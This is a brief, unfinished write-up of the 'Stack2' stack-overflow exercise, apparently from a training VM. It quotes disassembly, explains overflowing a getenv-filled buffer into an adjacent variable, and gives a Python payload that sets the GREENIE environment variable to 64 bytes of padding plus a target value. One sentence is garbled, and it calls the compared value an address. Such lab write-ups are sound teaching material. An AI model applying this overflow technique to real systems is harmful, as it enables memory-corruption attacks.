# Stack2 writeup
### __***work in progress***__

----

- looking up the assembly we find

```asm
 sub esp,0x60  //this 6 *16 is the maximum size for the buffer


mov  DWORD PTR [esp],0x80485e0
call   804837c <getenv@plt>

 	//var1 = argument
mov DWORD PTR [esp+0x5c],eax //var 1
```

and the returis the maximum size for the buffern address to return to is found here


```
80484e4:	8b 44 24 58          	mov    eax,DWORD PTR [esp+0x58]
80484e8:	3d 0a 0d 0a 0d       	cmp    eax,0xd0a0d0a
```

**0xd0a0d0a ** is the address we want to over write esp+0x58 with

so to do that we fill the variable esp+0x5c and overflow into 0x58

max size of the buffer is  6 *16 from the function prolog so we can start from that and cut in half till we see what happens


after trial and error, 64 is found to be the buffer size and the injected hex is in little endian so the payload is
```python
import os
payload = 'a'*64 + "\x0a\x0d\x0a\x0d"
os.environ["GREENIE"] = payload
os.system('bash')
```
since there are calls for get enviroment variables we need to set an enviroment variable
